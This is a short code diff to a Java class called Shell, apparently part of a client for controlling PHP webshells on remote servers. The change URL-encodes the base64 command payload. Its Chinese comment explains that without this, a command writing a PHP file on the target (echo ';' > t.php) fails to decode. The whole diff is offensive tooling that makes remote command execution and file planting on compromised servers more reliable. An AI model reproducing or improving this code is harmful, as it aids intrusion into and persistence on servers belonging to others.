@@ -188,7 +188,12 @@ public class Shell {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		tmp = (new BASE64Encoder().encode(z12)).toString() + "&"+Safe.PARAM2+"=" + (new BASE64Encoder().encode(z22)).toString();
+				
+		//这里要进行一些url编码，否则执行echo ';' > t.php时就会产生+和换行，导致目标端解析base64失败
+		String change = (new BASE64Encoder().encode(z22)).toString();
+		change = change.replace("+","%2b").replace("\n","");
+		 
+		tmp = (new BASE64Encoder().encode(z12)).toString() + "&"+Safe.PARAM2+"=" + change;
 		params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_SHELL, tmp);
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String result = null;
